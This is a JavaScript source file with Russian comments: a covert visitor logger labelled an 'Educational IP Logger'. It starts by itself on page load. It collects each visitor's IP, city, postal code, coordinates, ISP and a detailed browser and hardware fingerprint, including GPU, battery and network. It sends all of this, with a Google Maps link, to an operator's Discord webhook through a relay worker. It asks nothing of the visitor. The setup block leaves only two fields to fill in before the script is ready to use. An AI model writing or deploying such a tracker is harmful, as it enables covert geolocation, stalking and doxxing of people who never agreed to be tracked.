// ==================================================
// НАСТРОЙКИ — ЗАПОЛНИ ДВА ПОЛЯ
// ==================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ID/ВАШ_ТОКЕН";
const WORKER_URL  = "https://ВАШ_ВОРКЕР.ВАШ_НИК.workers.dev";
// ==================================================

async function collectAndSend() {
    try {
        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());

        const data = {
            ip: ipData.ip,
            city: ipData.city,
            region: ipData.region,
            country: ipData.country_name,
            postal: ipData.postal,
            latitude: ipData.latitude,
            longitude: ipData.longitude,
            org: ipData.org,
            timezone: ipData.timezone,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: (navigator.languages || []).join(", "),
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            window: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory || "N/A",
            touchSupport: 'ontouchstart' in window,
            cookiesEnabled: navigator.cookieEnabled,
            referrer: document.referrer || "прямой заход",
            localTime: new Date().toLocaleString("ru-RU"),
            battery: await getBattery(),
            connection: getConnection(),
            gpu: getGPU(),
            pageUrl: location.href,
        };

        await sendToDiscord(data);
    } catch (e) {
        console.error("Ошибка сбора:", e);
    }
}

async function getBattery() {
    if (!navigator.getBattery) return "N/A";
    try {
        const b = await navigator.getBattery();
        return `${Math.round(b.level * 100)}% ${b.charging ? "(заряжается)" : ""}`;
    } catch { return "N/A"; }
}

function getConnection() {
    const c = navigator.connection;
    if (!c) return "N/A";
    return `${c.effectiveType || "?"} / ${c.downlink || "?"} Mbps`;
}

function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        const info = gl.getExtension("WEBGL_debug_renderer_info");
        return gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
    } catch { return "N/A"; }
}

async function sendToDiscord(d) {
    const fields = [
        { name: "🌐 IP", value: d.ip || "?", inline: false },
        { name: "📍 Локация", value: `${d.city}, ${d.region}, ${d.country} (${d.postal})`, inline: false },
        { name: "🧭 Координаты", value: `${d.latitude}, ${d.longitude}`, inline: false },
        { name: "🗺️ Карта", value: `[Google Maps](https://www.google.com/maps?q=${d.latitude},${d.longitude})`, inline: false },
        { name: "🏢 Провайдер", value: d.org || "?", inline: false },
        { name: "🕐 Часовой пояс", value: d.timezone || "?", inline: true },
        { name: "🕒 Локальное время", value: d.localTime, inline: true },
        { name: "💻 ОС / Платформа", value: d.platform, inline: true },
        { name: "🖥️ Экран", value: `${d.screen} (${d.colorDepth}bit, x${d.pixelRatio})`, inline: true },
        { name: "🪟 Окно", value: d.window, inline: true },
        { name: "🌍 Язык", value: `${d.language} (${d.languages})`, inline: true },
        { name: "⚙️ CPU ядер", value: `${d.cores}`, inline: true },
        { name: "🧠 RAM", value: `${d.memory} GB`, inline: true },
        { name: "🎮 GPU", value: d.gpu, inline: false },
        { name: "🔋 Батарея", value: d.battery, inline: true },
        { name: "📶 Сеть", value: d.connection, inline: true },
        { name: "🍪 Cookies", value: d.cookiesEnabled ? "включены" : "выключены", inline: true },
        { name: "👆 Touch", value: d.touchSupport ? "да" : "нет", inline: true },
        { name: "🔗 Referrer", value: d.referrer, inline: false },
        { name: "🧾 User-Agent", value: "```" + d.userAgent + "```", inline: false },
    ];

    const payload = {
        username: "🐱 Котик-логгер",
        embeds: [{
            title: "Новый посетитель!",
            color: 0x764ba2,
            fields,
            timestamp: new Date().toISOString(),
            footer: { text: "Educational IP Logger" }
        }]
    };

    const target = `${WORKER_URL}?webhook=${encodeURIComponent(WEBHOOK_URL)}`;

    await fetch(target, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });
}

window.addEventListener("load", () => setTimeout(collectAndSend, 800));